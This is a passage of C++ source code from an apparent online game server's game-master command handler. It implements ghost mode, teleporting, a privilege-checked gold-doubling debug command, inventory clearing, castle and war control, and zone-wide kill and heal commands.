        Zone *pZone = pCreature->getZone();
        Assert(pZone != NULL);

        Tile &rTile = pZone->getTile(pCreature->getX(), pCreature->getY());
        if (!rTile.isAirBlocked() && !rTile.hasPortal()) {
          // Broadcasts the fact that the creature has disappeared to nearby PCs.
          /*					GCDeleteObject
             gcDeleteObject(pCreature->getObjectID());
                                                  pZone->broadcastPacket(pCreature->getX(),
             pCreature->getY(), &gcDeleteObject, pCreature);*/

          rTile.deleteCreature(pCreature->getObjectID());
          pCreature->setMoveMode(Creature::MOVE_MODE_FLYING);
          rTile.addCreature(pCreature);

          GCAddEffect gcAddEffect;
          gcAddEffect.setObjectID(pCreature->getObjectID());
          gcAddEffect.setEffectID(Effect::EFFECT_CLASS_GHOST);
          gcAddEffect.setDuration(999999);
          pGamePlayer->sendPacket(&gcAddEffect);

          EffectGhost *pEffect = new EffectGhost(pCreature);
          pCreature->getEffectManager()->addEffect(pEffect);
          pCreature->setFlag(Effect::EFFECT_CLASS_GHOST);
          pEffect->affect(pCreature);

          gcSystemMessage.setMessage(msg);
        } else {
          gcSystemMessage.setMessage(
              g_pStringPool->getString(STRID_AIR_BLOCKED));
        }
      }
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (value1 == "off") {
      char msg[50];
      sprintf(msg, g_pStringPool->c_str(STRID_GHOST), "OFF");

      StringStream message;
      if (!bGhost)
        gcSystemMessage.setMessage(msg);
      else {
        Zone *pZone = pCreature->getZone();
        Assert(pZone != NULL);

        Tile &rTile = pZone->getTile(pCreature->getX(), pCreature->getY());
        if (!rTile.isGroundBlocked() && !rTile.hasPortal()) {
          rTile.deleteCreature(pCreature->getObjectID());
          pCreature->setMoveMode(Creature::MOVE_MODE_WALKING);
          rTile.addCreature(pCreature);

          Effect *pGhost = pCreature->findEffect(Effect::EFFECT_CLASS_GHOST);
          if (pGhost)
            pGhost->setDeadline(0);
          gcSystemMessage.setMessage(msg);

          GCRemoveEffect gcRemoveEffect;
          gcRemoveEffect.setObjectID(pCreature->getObjectID());
          gcRemoveEffect.addEffectList(Effect::EFFECT_CLASS_GHOST);
          pGamePlayer->sendPacket(&gcRemoveEffect);

          /*					if (pCreature->isSlayer())
                                                  {
                                                          Slayer* pSlayer =
             dynamic_cast<Slayer*>(pCreature);

                                                          GCAddSlayer
             gcAddSlayer; makeGCAddSlayer(&gcAddSlayer, pSlayer);
                                                          pZone->broadcastPacket(&gcAddSlayer,
             pCreature);
                                                  }
                                                  else if
             (pCreature->isVampire())
                                                  {
                                                          Vampire* pVampire =
             dynamic_cast<Vampire*>(pCreature);

                                                          GCAddVampire
             gcAddVampire; makeGCAddVampire(&gcAddVampire, pVampire);
                                                          pZone->broadcastPacket(&gcAddVampire,
             pCreature);
                                                  }
                                                  else if
             (pCreature->isOusters())
                                                  {
                                                          Ousters* pOusters =
             dynamic_cast<Ousters*>(pCreature);

                                                          GCAddOusters
             gcAddOusters; makeGCAddOusters(&gcAddOusters, pOusters);
                                                          pZone->broadcastPacket(&gcAddOusters,
             pCreature);
                                                  }*/
        } else {
          gcSystemMessage.setMessage(
              g_pStringPool->getString(STRID_GROUND_BLOCKED));
        }
      }

      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else {
      bSendPacket = false;
    }
  } else if (command == "gmplayers") {
    sendGMOnlinePlayersList(pGamePlayer);
    bSendPacket = false;
  } else if (command == "gmgoto") {
    teleportGMToOnlinePlayer(pGamePlayer, value1);
    bSendPacket = false;
  }
  // 2026-05-09: twiceMoney re-enabled with explicit DM/GOD gate.
  // Eski versiyon yorum bloğunda devre disiydi, yetki kontrolu yoktu.
  // Bu sub-command opcommand altinda — opcommand dispatch zaten DM/GOD
  // gate'i ile geliyor, ama defense-in-depth icin function-icinden de check.
  // Test/debug amacli: caller'in altinini 2 kati yapar.
  // CAVEAT: setGold() client'a otomatik packet gondermeyebilir; degisiklik
  // re-login sonrasi tam senkronize olur.
  else if (command == "twiceMoney") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature == NULL)
      return;

    if (!(pCreature->isGOD() || pCreature->isDM())) {
      filelog("admin.log",
              "twiceMoney: REJECTED (insufficient privilege) caller=%s competence=%d",
              pCreature->getName().c_str(), (int)pCreature->getCompetence());
      return;
    }

    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);
    if (pPC == NULL) {
      gcSystemMessage.setMessage("twiceMoney: caller is not a PlayerCreature.");
      return;
    }

    Gold_t before = pPC->getGold();
    pPC->setGold(before * 2);
    Gold_t after = pPC->getGold();

    char buf[128];
    snprintf(buf, sizeof(buf),
             "Gold doubled (debug): %u -> %u (re-login may be needed for client refresh)",
             (uint)before, (uint)after);
    gcSystemMessage.setMessage(buf);

    filelog("admin.log", "twiceMoney: caller=%s gold %u -> %u",
            pPC->getName().c_str(), (uint)before, (uint)after);
  } else if (command == "clearInventory") {
    gcSystemMessage.setMessage(g_pStringPool->getString(STRID_CLEAR_INVENTORY));

    Creature *pCreature = pGamePlayer->getCreature();
    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);
    Inventory *pInventory = pPC->getInventory();

    int i, j;

    try {
      if (pInventory != NULL) {
        for (j = 0; j < pInventory->getHeight(); j++) {
          for (i = 0; i < pInventory->getWidth(); i++) {
            Item *pItem = pInventory->getItem(i, j);

            if (pItem != NULL) {
              // If it's not the key, delete it.
              if (pItem->getItemClass() != Item::ITEM_CLASS_KEY &&
                  !isRelicItem(pItem)) {
                //  If it is a unique item, reduce the quantity.
                if (pItem->isUnique()) {
                  // UniqueItemManager::deleteItem( pItem->getItemClass(),
                  // pItem->getItemType() );
                  filelog("uniqueItem.txt", "[ClearInventory] %s",
                          pItem->toString().c_str());
                }

                pInventory->deleteItem(i, j);
                pItem->whenPCLost(pPC);
                pItem->destroy();

                // Records an ItemTrace log
                if (pItem != NULL && pItem->isTraceItem()) {
                  remainTraceLog(pItem, pCreature->getName(), "GOD",
                                 ITEM_LOG_DELETE, DETAIL_OPCLEAR);
                }

                SAFE_DELETE(pItem);
              }
            } // end of if (pItem != NULL)
          } // end of for
        } // end of for
      }

      // I don't have an inventory cleanup packet... -_-;
      transportCreature(pCreature, pCreature->getZone()->getZoneID(),
                        pCreature->getX(), pCreature->getY(), false);
    } catch (Throwable &t) {
      gcSystemMessage.setMessage(t.toString().c_str());
    }

  } else if (command == "clearRankBonus") {
    gcSystemMessage.setMessage("Rank Bonus Clear");

    Creature *pCreature = pGamePlayer->getCreature();
    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);

    pPC->clearRankBonus();
    pPC->initAllStat();
    pPC->sendRankBonusInfo();
  } else if (command == "setCastleOwner") {
    Creature *pCreature = pGamePlayer->getCreature();
    Zone *pZone = pCreature->getZone();
    const string &Name = value1;

    bSendPacket = false;

    if (pZone->isCastle()) {
      // *command setCastleOwner SlayerCommon  Slayer compatibility in this case
      if (value1 == "SlayerCommon") {
        g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(), RACE_SLAYER,
                                                99);
      }
      // *command setCastleOwner VampireCommon  In this case, Vampire compatibility
      else if (value1 == "VampireCommon") {
        g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(),
                                                RACE_VAMPIRE, 0);
      } else if (value1 == "OustersCommon") {
        g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(),
                                                RACE_OUSTERS, 66);
      }
      // *command setCastleOwner If a character name is transferred, the guild of that character
      else {
        GuildID_t guildID;
        Race_t race;
        if (getRaceFromDB(Name, race)) {
          if (getGuildIDFromDB(Name, race, guildID)) {
            g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(), race,
                                                    guildID);
          } else {
            gcSystemMessage.setMessage(
                g_pStringPool->getString(STRID_DO_NOT_BELONG_TO_GUILD));
            bSendPacket = true;
          }
        } else {
          gcSystemMessage.setMessage(
              g_pStringPool->getString(STRID_NO_SUCH_CHARACTOR));
          bSendPacket = true;
        }
      }

    } else {
      gcSystemMessage.setMessage(g_pStringPool->getString(STRID_NOT_IN_CASTLE));
      bSendPacket = true;
    }

  } else if (command == "setCastleOwnerGuild") {
    size_t j = value1.find_first_of(' ', 0);
    ZoneID_t zoneID = (ZoneID_t)atoi(trim(value1.substr(0, j)).c_str());
    GuildID_t guildID = (GuildID_t)atoi(
        trim(value1.substr(j + 1, value1.size() - j - 1)).c_str());

    //		cout << zoneID << endl;
    //		cout << guildID << endl;

    bSendPacket = false;

    Zone *pZone = getZoneByZoneID(zoneID);
    Guild *pGuild = g_pGuildManager->getGuild(guildID);

    if (pZone != NULL && pZone->isCastle() && pGuild != NULL) {
      g_pCastleInfoManager->modifyCastleOwner(zoneID, pGuild->getRace(),
                                              guildID);
    } else if (pZone != NULL && pZone->isCastle() && guildID == 99) {
      g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(), RACE_SLAYER,
                                              99);
    }
    // *command setCastleOwner VampireCommon  In this case, Vampire compatibility
    else if (pZone != NULL && pZone->isCastle() && guildID == 0) {
      g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(), RACE_VAMPIRE,
                                              0);
    } else if (pZone != NULL && pZone->isCastle() && guildID == 66) {
      g_pCastleInfoManager->modifyCastleOwner(pZone->getZoneID(), RACE_OUSTERS,
                                              66);
    }

  } else if (command == "showWarList") {
    //  This displays a list of ongoing wars.

    g_pWarSystem->broadcastWarList(pGamePlayer);
    bSendPacket = false;
  } else if (command == "startRaceWar") {
    if (!g_pVariableManager->isWarActive()) {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_WAR_OFF_DO_WAR_ACITIVE_ON));
    } else if (g_pWarSystem->startRaceWar()) {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_RACE_WAR_START));
    } else {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_ALREADY_WAR_STARTED_OF_SERVER_ERROR));
    }
    bSendPacket = true;
  } else if (command == "startWar") {
    Creature *pCreature = pGamePlayer->getCreature();
    Zone *pZone = pCreature->getZone();

    WarScheduler *pScheduler = pZone->getWarScheduler();
    if (pScheduler != NULL) {
      Schedule *pSchedule = pScheduler->getRecentSchedule();
      if (pSchedule != NULL)
        pSchedule->setScheduledTime(VSDateTime::currentDateTime());
    }
  } else if (command == "removeWar") {
    ZoneID_t zoneID = atoi(value1.c_str());

    if (zoneID == 0) {
      if (pGamePlayer != NULL) {
        Creature *pCreature = pGamePlayer->getCreature();
        Zone *pZone = pCreature->getZone();

        zoneID = pZone->getZoneID();
      } else {
        return;
      }
    }

    if (g_pWarSystem->removeWar(zoneID)) {
      //			StringStream msg;
      //			msg << "[" << (int)zoneID << "]  
      //"We have eliminated the war.";
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_GUILD_WAR_REMOVED), (int)zoneID);
      gcSystemMessage.setMessage(msg);
    } else {
      //			StringStream msg;
      //			msg << "[" << (int)zoneID << "]  "There is no war currently underway.";
      char msg[100];
      sprintf(msg, g_pStringPool->c_str(STRID_NO_GUILD_WAR_IN_ACTIVE),
              (int)zoneID);
      gcSystemMessage.setMessage(msg);
    }
    bSendPacket = true;
  } else if (command == "removeRaceWar") {
    if (g_pWarSystem->removeRaceWar()) {
      //			StringStream msg;
      //			msg << "The Race War has been removed.";
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_RACE_WAR_REMOVED));
    } else {
      //			StringStream msg;
      //			msg << "There are no ongoing race wars.";
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_NO_RACE_WAR_IN_ACTIVE));
    }
    bSendPacket = true;
  } else if (command == "LevelWar") {
    if (!g_pVariableManager->isWarActive()) {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_WAR_OFF_DO_WAR_ACITIVE_ON));
    }
    if (g_pVariableManager->isActiveLevelWar()) {
      ZoneID_t zoneID = atoi(value1.c_str());

      if (zoneID != 1131 && zoneID != 1132 && zoneID != 1133 && zoneID != 1134)
        return;

      Zone *pZone = getZoneByZoneID(zoneID);

      Assert(pZone != NULL);

      LevelWarManager *pLevelWarManager = pZone->getLevelWarManager();

      if (pLevelWarManager != NULL) {
        gcSystemMessage.setMessage("LevelWar advanced.");
        pLevelWarManager->manualStart();
      }
    }
  } else if (command == "saveBloodBibleOwner") {
    g_pShrineInfoManager->saveBloodBibleOwner();

    StringStream msg;
    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_SAVE_BLOOD_BIBLE_OWNER_INFO_IN_DB));

    bSendPacket = true;
  } else if (command == "killAllMonster") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      MonsterManager *pMM = pZone->getMonsterManager();
      map<ObjectID_t, Creature *> &monsters = pMM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = monsters.begin();

      for (; itr != monsters.end(); itr++) {
        Creature *pCreature = itr->second;
        Monster *pMonster = dynamic_cast<Monster *>(pCreature);

        if (pMonster != NULL &&
            !pMonster->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          pMonster->setHP(0);
        }
      }

      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_KILL_ALL_MONSTER_IN_ZONE));
    }
  } else if (command == "killAllPC") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          if (pPlayerCreature->isSlayer()) {
            dynamic_cast<Slayer *>(pPlayerCreature)->setHP(0);
          }
          if (pPlayerCreature->isVampire()) {
            dynamic_cast<Vampire *>(pPlayerCreature)->setHP(0);
          }
          if (pPlayerCreature->isOusters()) {
            dynamic_cast<Ousters *>(pPlayerCreature)->setHP(0);
          }
        }
      }

      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_KILL_ALL_MONSTER_IN_ZONE));
    }
  } else if (command == "killAllSlayer") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          if (pPlayerCreature->isSlayer()) {
            dynamic_cast<Slayer *>(pPlayerCreature)->setHP(0);
          }
        }
      }
      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }
  } else if (command == "killAllOusters") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          if (pPlayerCreature->isOusters()) {
            dynamic_cast<Ousters *>(pPlayerCreature)->setHP(0);
          }
        }
      }
      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }
  } else if (command == "killAllVampire") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          if (pPlayerCreature->isVampire()) {
            dynamic_cast<Vampire *>(pPlayerCreature)->setHP(0);
          }
        }
      }
      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }
  } else if (command == "healAllPC") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (pCreature->isFlag(Effect::EFFECT_CLASS_COMA)) {
          // Delete the coma effect from the target's Effect Manager.
          pCreature->deleteEffect(Effect::EFFECT_CLASS_COMA);
          pCreature->removeFlag(Effect::EFFECT_CLASS_COMA);

          // It notifies you that the Coma Effect has been removed.
          GCRemoveEffect gcRemoveEffect;
          gcRemoveEffect.setObjectID(pCreature->getObjectID());
          gcRemoveEffect.addEffectList((EffectID_t)Effect::EFFECT_CLASS_COMA);
          pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                 &gcRemoveEffect);

          // It resends the effect information.
          pCreature->getEffectManager()->sendEffectInfo(
              pCreature, pZone, pCreature->getX(), pCreature->getY());
        }

        if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
          HP_t hp = 0;

          if (pPlayerCreature->isSlayer()) {
            hp = dynamic_cast<Slayer *>(pPlayerCreature)->getHP(ATTR_MAX);
            dynamic_cast<Slayer *>(pPlayerCreature)->setHP(hp);
          }
          if (pPlayerCreature->isVampire()) {
            hp = dynamic_cast<Vampire *>(pPlayerCreature)->getHP(ATTR_MAX);
            dynamic_cast<Vampire *>(pPlayerCreature)->setHP(hp);
          }
          if (pPlayerCreature->isOusters()) {
            hp = dynamic_cast<Ousters *>(pPlayerCreature)->getHP(ATTR_MAX);
            dynamic_cast<Ousters *>(pPlayerCreature)->setHP(hp);
          }

          if (hp != 0) {
            // Notifies those around you that your health has been restored.
            GCStatusCurrentHP gcStatusCurrentHP;
            gcStatusCurrentHP.setObjectID(pCreature->getObjectID());
            gcStatusCurrentHP.setCurrentHP(hp);
            pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                   &gcStatusCurrentHP);
          }
        }
      }

      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }

  } else if (command == "healAllSlayer") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (pCreature->isSlayer()) {
          if (pCreature->isFlag(Effect::EFFECT_CLASS_COMA)) {
            // Delete the coma effect from the target's Effect Manager.
            pCreature->deleteEffect(Effect::EFFECT_CLASS_COMA);
            pCreature->removeFlag(Effect::EFFECT_CLASS_COMA);

            // It notifies you that the Coma Effect has been removed.
            GCRemoveEffect gcRemoveEffect;
            gcRemoveEffect.setObjectID(pCreature->getObjectID());
            gcRemoveEffect.addEffectList((EffectID_t)Effect::EFFECT_CLASS_COMA);
            pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                   &gcRemoveEffect);

            // It resends the effect information.
            pCreature->getEffectManager()->sendEffectInfo(
                pCreature, pZone, pCreature->getX(), pCreature->getY());
          }

          if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
            HP_t hp = 0;

            if (pPlayerCreature->isSlayer()) {
              hp = dynamic_cast<Slayer *>(pPlayerCreature)->getHP(ATTR_MAX);
              dynamic_cast<Slayer *>(pPlayerCreature)->setHP(hp);
            }
            if (hp != 0) {
              // Notifies those around you that your health has been restored.
              GCStatusCurrentHP gcStatusCurrentHP;
              gcStatusCurrentHP.setObjectID(pCreature->getObjectID());
              gcStatusCurrentHP.setCurrentHP(hp);
              pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                     &gcStatusCurrentHP);
            }
          }
        }
      }

      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }

  } else if (command == "healAllVampire") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (pCreature->isVampire()) {
          if (pCreature->isFlag(Effect::EFFECT_CLASS_COMA)) {
            // Delete the coma effect from the target's Effect Manager.
            pCreature->deleteEffect(Effect::EFFECT_CLASS_COMA);
            pCreature->removeFlag(Effect::EFFECT_CLASS_COMA);

            // It notifies you that the Coma Effect has been removed.
            GCRemoveEffect gcRemoveEffect;
            gcRemoveEffect.setObjectID(pCreature->getObjectID());
            gcRemoveEffect.addEffectList((EffectID_t)Effect::EFFECT_CLASS_COMA);
            pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                   &gcRemoveEffect);

            // It resends the effect information.
            pCreature->getEffectManager()->sendEffectInfo(
                pCreature, pZone, pCreature->getX(), pCreature->getY());
          }

          if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
            HP_t hp = 0;

            if (pPlayerCreature->isVampire()) {
              hp = dynamic_cast<Vampire *>(pPlayerCreature)->getHP(ATTR_MAX);
              dynamic_cast<Vampire *>(pPlayerCreature)->setHP(hp);
            }
            if (hp != 0) {
              // Notifies those around you that your health has been restored.
              GCStatusCurrentHP gcStatusCurrentHP;
              gcStatusCurrentHP.setObjectID(pCreature->getObjectID());
              gcStatusCurrentHP.setCurrentHP(hp);
              pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                     &gcStatusCurrentHP);
            }
          }
        }
      }

      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }

  } else if (command == "healAllOusters") {
    if (pGamePlayer != NULL) {
      Creature *pCreature = pGamePlayer->getCreature();
      Zone *pZone = pCreature->getZone();
      PCManager *pPM = (PCManager *)pZone->getPCManager();
      map<ObjectID_t, Creature *> &pcs = pPM->getCreatures();
      map<ObjectID_t, Creature *>::iterator itr = pcs.begin();

      for (; itr != pcs.end(); itr++) {
        Creature *pCreature = itr->second;
        PlayerCreature *pPlayerCreature =
            dynamic_cast<PlayerCreature *>(pCreature);

        if (pCreature->isOusters()) {
          if (pCreature->isFlag(Effect::EFFECT_CLASS_COMA)) {
            // Delete the coma effect from the target's Effect Manager.
            pCreature->deleteEffect(Effect::EFFECT_CLASS_COMA);
            pCreature->removeFlag(Effect::EFFECT_CLASS_COMA);

            // It notifies you that the Coma Effect has been removed.
            GCRemoveEffect gcRemoveEffect;
            gcRemoveEffect.setObjectID(pCreature->getObjectID());
            gcRemoveEffect.addEffectList((EffectID_t)Effect::EFFECT_CLASS_COMA);
            pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                   &gcRemoveEffect);

            // It resends the effect information.
            pCreature->getEffectManager()->sendEffectInfo(
                pCreature, pZone, pCreature->getX(), pCreature->getY());
          }

          if (!pPlayerCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) {
            HP_t hp = 0;

            if (pPlayerCreature->isOusters()) {
              hp = dynamic_cast<Ousters *>(pPlayerCreature)->getHP(ATTR_MAX);
              dynamic_cast<Ousters *>(pPlayerCreature)->setHP(hp);
            }
            if (hp != 0) {
              // Notifies those around you that your health has been restored.
              GCStatusCurrentHP gcStatusCurrentHP;
              gcStatusCurrentHP.setObjectID(pCreature->getObjectID());
              gcStatusCurrentHP.setCurrentHP(hp);
              pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                     &gcStatusCurrentHP);
            }
          }
        }
      }

      //			gcSystemMessage.setMessage(
      //g_pStringPool->getString( STRID_KILL_ALL_MONSTER_IN_ZONE ) );
    }

  } else if (command == "showZonePCNum") {
    if (pGamePlayer != NULL) {
      WORD num =
          pGamePlayer->getCreature()->getZone()->getPCManager()->getSize();
      char msg[100];
      sprintf(msg, g_pStringPool->getString(STRID_PC_NUM).c_str(), num);
      gcSystemMessage.setMessage(msg);
    }
  } else if (command == "showPKZonePCNum") {
    if (pGamePlayer != NULL) {
      ZoneID_t zoneID = pGamePlayer->getCreature()->getZone()->getZoneID();
      if (g_pPKZoneInfoManager->isPKZone(zoneID)) {
        int num =
            g_pPKZoneInfoManager->getPKZoneInfo(zoneID)->getCurrentPCNum();

        char msg[100];
        sprintf(msg, g_pStringPool->getString(STRID_PC_NUM).c_str(), num);
        gcSystemMessage.setMessage(msg);
      } else {
        bSendPacket = false;
      }
    }
  } else if (command == "setPKZonePCNum") {
    if (pGamePlayer != NULL) {
      ZoneID_t zoneID = pGamePlayer->getCreature()->getZone()->getZoneID();

      size_t j = value1.find_first_of(' ', 0);
      int num = atoi(trim(value1.substr(0, j)).c_str());

      if (g_pPKZoneInfoManager->isPKZone(zoneID)) {
        g_pPKZoneInfoManager->getPKZoneInfo(zoneID)->setCurrentPCNum(num);
      }
    }
  } else if (command == "suicide") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      if (pCreature->isSlayer()) {
        Slayer *pSlayer = dynamic_cast<Slayer *>(pCreature);
        pSlayer->setHP(0);
      } else if (pCreature->isVampire()) {
        Vampire *pVampire = dynamic_cast<Vampire *>(pCreature);
        pVampire->setHP(0);
      } else if (pCreature->isOusters()) {
        Ousters *pOusters = dynamic_cast<Ousters *>(pCreature);
        pOusters->setHP(0);
      }
    }

    bSendPacket = false;
  } else if (command == "heal") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      Zone *pZone = pCreature->getZone();

      if (pCreature->isFlag(Effect::EFFECT_CLASS_COMA)) {
        // Delete the coma effect from the target's Effect Manager.
        pCreature->deleteEffect(Effect::EFFECT_CLASS_COMA);
        pCreature->removeFlag(Effect::EFFECT_CLASS_COMA);

        // It notifies you that the Coma Effect has been removed.
        GCRemoveEffect gcRemoveEffect;
        gcRemoveEffect.setObjectID(pCreature->getObjectID());
        gcRemoveEffect.addEffectList((EffectID_t)Effect::EFFECT_CLASS_COMA);
        pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                               &gcRemoveEffect);

        // It resends the effect information.
        pCreature->getEffectManager()->sendEffectInfo(
            pCreature, pZone, pCreature->getX(), pCreature->getY());
      }

      HP_t hp = 0;
      MP_t mp = 0;

      if (pCreature->isSlayer()) {
        Slayer *pSlayer = dynamic_cast<Slayer *>(pCreature);
        hp = pSlayer->getHP(ATTR_MAX);
        pSlayer->setHP(hp);
        mp = pSlayer->getMP(ATTR_MAX);
        pSlayer->setMP(mp);
      } else if (pCreature->isVampire()) {
        Vampire *pVampire = dynamic_cast<Vampire *>(pCreature);
        hp = pVampire->getHP(ATTR_MAX);
        pVampire->setHP(hp);

        if (pVampire->getSilverDamage() != 0) {
          pVampire->setSilverDamage(0);
          GCModifyInformation gcMI;
          gcMI.addShortData(MODIFY_SILVER_DAMAGE, 0);
          pGamePlayer->sendPacket(&gcMI);
        }
      } else if (pCreature->isOusters()) {
        Ousters *pOusters = dynamic_cast<Ousters *>(pCreature);
        hp = pOusters->getHP(ATTR_MAX);
        pOusters->setHP(hp);

        if (pOusters->getSilverDamage() != 0) {
          pOusters->setSilverDamage(0);
          GCModifyInformation gcMI;
          gcMI.addShortData(MODIFY_SILVER_DAMAGE, 0);
          pGamePlayer->sendPacket(&gcMI);
        }

        mp = pOusters->getMP(ATTR_MAX) * 2;
        pOusters->setMP(mp);
      }

      if (hp != 0) {
        // Notifies those around you that your health has been restored.
        GCStatusCurrentHP gcStatusCurrentHP;
        gcStatusCurrentHP.setObjectID(pCreature->getObjectID());
        gcStatusCurrentHP.setCurrentHP(hp);
        pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                               &gcStatusCurrentHP);
      }

      if (mp != 0) {
        GCModifyInformation gcMI;
        gcMI.addShortData(MODIFY_CURRENT_MP, mp);
        pGamePlayer->sendPacket(&gcMI);
      }
    }

    bSendPacket = false;
  } else if (command == "setGold") {
    Gold_t gold = atoi(value1.c_str());
    Creature *pCreature = pGamePlayer->getCreature();

    if (pCreature != NULL) {
      GCModifyInformation gcMI;

      if (pCreature->isSlayer()) {
